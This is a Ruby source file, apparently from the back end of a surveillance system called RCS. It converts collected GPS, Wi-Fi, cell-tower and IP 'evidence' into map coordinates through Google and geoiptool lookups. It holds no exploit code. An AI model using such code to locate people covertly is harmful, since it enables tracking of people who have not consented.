#
#  Class for translating locations (cell, wifi, ip) into coordinates
#

require_relative 'frontend'

# from RCS::Common
require 'rcs-common/trace'

require 'net/http'
require 'json'

module RCS
module DB

class PositionResolver
  extend RCS::Tracer
  
  @@cache = {}

  class << self

    def get(params)

      request = params.dup

      # check for cached values (to avoid too many external request)
      cached = get_cache params
      return cached if cached

      begin
        trace :debug, "Position resolving..."

        location = {}

        if request['ip_address']
          location = get_geoip(request['ip_address']['ipv4'])
        elsif request['location'] or request['wifi_towers'] or request['cell_towers']
          common = {request_address: true, address_language: 'en_US', version: '1.1.0', host: 'maps.google.com'}
          request.merge! common
          location = get_google(request)
        end

        # remember the response for future requests
        put_cache(params, location)

        return location
      rescue Exception => e
        trace :warn, "Error retrieving location: #{e.message}"
        return {'location' => {}, 'address' => {}}
      end
    end

    def get_google(request)
      # Gears API: http://code.google.com/apis/gears/geolocation_network_protocol.html
      # Gears Wiki: http://code.google.com/p/gears/wiki/GeolocationAPI
      Timeout::timeout(3) do
        response = Frontend.proxy('POST', 'www.google.com', '/loc/json', request.to_json)
        response.kind_of? Net::HTTPSuccess or raise(response.body)
        resp = JSON.parse(response.body)
        resp['location'] or raise('invalid response')
      end
    end
    
    def get_geoip(ip)
      Timeout::timeout(3) do
        response = Frontend.proxy('GET', 'geoiptool.com', "/webapi.php?type=1&IP=#{ip}")
        response.kind_of? Net::HTTPSuccess or raise(response.body)
        resp = response.body.match /onLoad=.crearmapa([^)]*)/
        coords = resp.to_s.split('"')
        raise('not found') if (coords[3] == '' and coords[1] == '') or coords[3].nil? or coords[1].nil?
        {'latitude' => coords[3].to_f, 'longitude' => coords[1].to_f, 'accuracy' => 20000, 'address' => {'country' => coords[7]}}
      end
    end

    def get_cache(request)
      @@cache[request.hash]
    end

    def put_cache(request, response)
      @@cache[request.hash] = response
    end


    def decode_evidence(data)

      case data['type']
        when 'GPS'
          q = {map: {location: {latitude: data['latitude'], longitude: data['longitude']}}}
        when 'WIFI'
          towers = []
          data['wifi'].each do |wifi|
            towers << {mac_address: wifi[:mac], signal_strength: wifi[:sig], ssid: wifi[:bssid]}
          end
          q = {map: {wifi_towers: towers}}
        when 'GSM'
          q = {map: {cell_towers: [
              {mobile_country_code: data['cell']['mcc'], mobile_network_code: data['cell']['mnc'], location_area_code: data['cell']['lac'], cell_id: data['cell']['cid'], signal_strength: data['cell']['db'], timing_advance: data['cell']['adv'], age: data['cell']['age']}
          ], radio_type: 'gsm'}}
        when 'CDMA'
          q = {map: {cell_towers: [
              {mobile_country_code: data['cell']['mcc'], mobile_network_code: data['cell']['sid'], location_area_code: data['cell']['nid'], cell_id: data['cell']['bid'], signal_strength: data['cell']['db'], timing_advance: data['cell']['adv'], age: data['cell']['age']}
          ], radio_type: 'cdma'}}
        when 'IPv4'
          q = {map: {ip_address: {ipv4: data['ip']}}}
      end

      PositionResolver.get q[:map]
    end

  end

end


end #DB::
end #RCS::
